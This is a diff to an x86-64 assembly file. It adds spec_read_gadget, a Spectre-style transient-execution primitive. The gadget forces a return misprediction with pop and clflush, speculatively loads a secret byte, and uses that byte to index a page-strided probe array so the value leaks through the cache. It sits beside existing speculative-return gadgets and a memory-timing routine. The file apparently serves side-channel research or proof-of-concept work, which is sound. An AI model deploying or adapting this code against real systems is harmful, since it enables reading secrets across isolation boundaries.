@@ -1,5 +1,5 @@
 section .text
-    global add, spec_ret_gadget, spec_ret_gadget_burst, spec_ret_store_gadget, time_memory_load
+    global add, spec_ret_gadget, spec_ret_gadget_burst, spec_ret_store_gadget, spec_read_gadget, time_memory_load
 
 add:
     mov rax, rdi
@@ -59,6 +59,29 @@ store_mispredict_return:
     lfence
     ret
 store_end:
+    ret
+
+; void spec_read_gadget(void *secret, void *probe_array)
+; rdi = address of secret byte
+; rsi = probe array base (must be NUM_BYTE_SLOTS * PAGE_SIZE bytes)
+; Speculatively loads secret byte and uses its value to index into probe_array,
+; encoding the byte value into the cache as a side channel.
+spec_read_gadget:
+    call read_level_a
+    jmp read_end
+read_level_a:
+    call read_mispredict_return
+    movzx rax, byte [rdi]       ; speculatively load secret byte
+    shl rax, 12                 ; rax *= PAGE_SIZE (4096 = 2^12)
+    add rax, rsi                ; rax = &probe_array[secret_byte * PAGE_SIZE]
+    mov rcx, [rax]              ; bring that cache line in
+    lfence
+read_mispredict_return:
+    pop rax
+    clflush [rsp]
+    lfence
+    ret
+read_end:
     ret
 
 time_memory_load:
